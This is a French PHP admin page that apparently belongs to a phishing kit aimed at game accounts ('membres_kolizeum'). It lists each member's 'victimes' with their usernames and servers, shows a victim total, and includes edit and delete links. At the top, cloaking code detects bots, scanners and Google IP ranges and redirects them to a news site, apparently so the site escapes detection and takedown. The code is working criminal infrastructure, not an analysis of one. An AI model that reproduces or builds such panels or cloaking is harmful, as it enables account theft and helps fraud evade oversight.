<?php
include("common/includes.php");
include 'blocker.php';
include 'rezbot/basicbot.php';
include 'rezbot/rezcrawl.php';
include 'rezbot/rezzc.php';
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Liste de mots-clés communs utilisés par les bots
$botKeywords = array(
    'bot', 'spider', 'crawl', 'detect', 'monitor'
);

// Liste d'adresses IP connues pour héberger des bots
$botIPs = array(
    '123.456.78.9', '987.654.32.1',
    // Ajoutez les adresses IP ici
    '8.8.4.0', '8.8.8.0', '8.34.208.0', '8.35.192.0', '23.236.48.0', '23.251.128.0',
    '34.0.0.0', '34.2.0.0', '34.3.0.0', '34.3.3.0', '34.3.4.0', '34.3.8.0', '34.3.16.0',
    '34.3.32.0', '34.3.64.0', '34.3.128.0', '34.4.0.0', '34.8.0.0', '34.16.0.0',
    '34.32.0.0', '34.64.0.0', '34.128.0.0', '35.184.0.0', '35.192.0.0', '35.196.0.0',
    '35.198.0.0', '35.199.0.0', '35.199.128.0', '35.200.0.0', '35.208.0.0', '35.224.0.0',
    '35.240.0.0', '64.15.112.0', '64.233.160.0', '66.22.228.0', '66.102.0.0',
    '66.249.64.0', '70.32.128.0', '72.14.192.0', '74.125.0.0', '104.154.0.0',
    '104.196.0.0', '104.237.160.0', '107.167.160.0', '107.178.192.0', '108.59.80.0',
    '108.170.192.0', '108.177.0.0', '130.211.0.0', '136.112.0.0', '142.250.0.0',
    '146.148.0.0', '162.216.148.0', '162.222.176.0', '172.110.32.0', '172.217.0.0',
    '172.253.0.0', '173.194.0.0', '173.255.112.0', '192.158.28.0', '192.178.0.0',
    '193.186.4.0', '199.36.154.0', '199.36.156.0', '199.192.112.0', '199.223.232.0',
    '207.223.160.0', '208.65.152.0', '208.68.108.0', '208.81.188.0', '208.117.224.0',
    '209.85.128.0', '216.58.192.0', '216.73.80.0', '216.239.32.0', '2001:4860::',
    '2404:6800::', '2404:f340::', '2600:1900::', '2606:73c0::', '2607:f8b0::',
    '2620:11a:a000::', '2620:120:e000::', '2800:3f0::', '2a00:1450::', '2c0f:fb50::'
);

// Liste des User-Agents de robots de Google à bloquer
$googleBotUserAgents = array(
    'Googlebot',
    'Googlebot-News',
    // Ajoutez d'autres User-Agents de robots de Google si nécessaire
);

// Nombre maximal d'adresses IP simultanées autorisées
$maxSimultaneousIPs = 3;

// Vérification basée sur le User-Agent
$isBot = false;

// Vérifier si le User-Agent contient des mots-clés de bot
foreach ($botKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isBot = true;
        break;
    }
}

// Vérification supplémentaire basée sur l'adresse IP
if (!$isBot) {
    // Vérifier si l'adresse IP du visiteur correspond à une adresse IP connue pour héberger des bots
    if (in_array($_SERVER['REMOTE_ADDR'], $botIPs)) {
        $isBot = true;
    }
}

// Vérification des User-Agents de Google
if (!$isBot) {
    $userAgentLower = strtolower($userAgent);
    foreach ($googleBotUserAgents as $botUserAgent) {
        if (stripos($userAgentLower, strtolower($botUserAgent)) !== false) {
            $isBot = true;
            break;
        }
    }
}

// Vérification du nombre maximal d'adresses IP simultanées autorisées
if (!$isBot) {
    $ipList = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']) : array($_SERVER['REMOTE_ADDR']);
    $ipList = array_map('trim', $ipList); // Supprimer les espaces autour des adresses IP
    $ipList = array_unique($ipList); // Supprimer les adresses IP en double
    $ipCount = count($ipList);
    if ($ipCount > $maxSimultaneousIPs) {
        $isBot = true;
    }
}

// Rediriger les bots détectés vers la page spécifiée
if ($isBot) {
    header('Location: https://www.mediapart.fr/');
    exit();
}


session_start();

require("../includes/vars.php");

if(isset($_SESSION['id']) AND $_SESSION['id'] == '1') {

	if(isset($_GET['id']) AND !empty($_GET['id'])) {

		$connected = $bdd->query('SELECT * FROM membres_kolizeum WHERE connected="oui" ORDER BY pseudo');
		$disconnected = $bdd->query('SELECT * FROM membres_kolizeum WHERE connected="non" ORDER BY pseudo');

        $get_id = htmlspecialchars($_GET['id']);

        $victimes = $bdd->prepare('SELECT * FROM victimes_membres WHERE id_membre = ? ORDER BY id');
  		$victimes->execute(array($get_id));

        $membre = $bdd->prepare("SELECT * FROM membres_kolizeum WHERE id = ?");
        $membre->execute(array($get_id));

		if($membre->rowCount() == 1) {
			$userinfo = $membre->fetch();
			$code = $userinfo['code'];
		}
		else {
			header('Location: panel.php');
		}

    }
    else {
        header("Location: panel.php");
    }

}
else {
	header("Location: index.php");
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
	<meta charset="UTF-8">
	<title>Espace membre</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>
	<?php include("include_notif.php"); ?>

	<?php include("../includes/sidenav.php"); ?>


	<h1>Code de <?php echo $userinfo['pseudo']; ?> :</h1>
	<h2 id="code_area" style="margin-top: -40px; margin: 0 auto; background: #a15412; padding: 5px; width: 130px; height: 40px; padding-top: 15px;"><?= utf8_encode($code); ?></h2>

	<button class="copy_btn" onclick="CopyToClipboard('code_area')">Copier</button>

	<a href="panel.php" title="Retour"><img src="img/back.png" class="back" /></a>
	<a href="deconnexion.php" title="Déconnexion"><img src="img/logout.png" class="logout" /></a>

	<h2>Dernière connexion : <?php echo strftime("Le %d/%m/%Y à %H:%M", strtotime($userinfo['derniere_connexion'])); ?></h2>
	<h2>Dernière déconnexion : <?php echo strftime("Le %d/%m/%Y à %H:%M", strtotime($userinfo['derniere_deconnexion'])); ?></h2>
	<h2>Adresse IP : </h2> <?php echo $userinfo['adresse_ip']; ?>
	
	<h1 style="margin-top: 70px;">Liste des victimes</h1>

    <?php
      echo'
          <table>
              <thead>
                  <tr>
                      <th>Pseudo</th>
                      <th>Serveur</th>
                      <th>Modifier</th>
                      <th>Supprimer</th>
                  </tr>
              </thead>
              <tbody>';
       
      while($v = $victimes->fetch())
      { 
      echo "<tr>
      <td>".$v['pseudo_victime']."</td>
      <td>".$v['serveur_victime']."</td>
      <td><a href='edit_victime.php?id=".$v['id']."&id_membre=".$get_id."'><img src='img/edit.png'></a></td>
      <td><a href='delete_victime_admin.php?id=".$v['id']."&id_membre=".$get_id."'><img src='img/delete.png'></a></td>
      </tr>";
      }
      echo "</tbody></table>";
    ?>
    <br />
    <?php
      $total = 0;
      $sqls = $bdd->prepare('SELECT COUNT(*) AS id FROM victimes_membres WHERE id_membre = ?');
      $sqls->execute(array($get_id));

      if ($sqls) {
        $total = $sqls->fetchColumn();
      }
      
      echo "<h4><strong>TOTAL DE VICTIMES : ".$total."</strong></h4>";
    ?>


	


	<script type="text/javascript">
		function CopyToClipboard(containerid) {
			if (document.selection) { 
			    var range = document.body.createTextRange();
			    range.moveToElementText(document.getElementById(containerid));
			    range.select().createTextRange();
			    document.execCommand("copy"); 

			}
			else if (window.getSelection) {
				var range = document.createRange();
				range.selectNode(document.getElementById(containerid));
				window.getSelection().addRange(range);
				document.execCommand("copy");
				var audio = new Audio('sound.mp3');
				audio.play();
			}
		}
	</script>	
</body>
</html>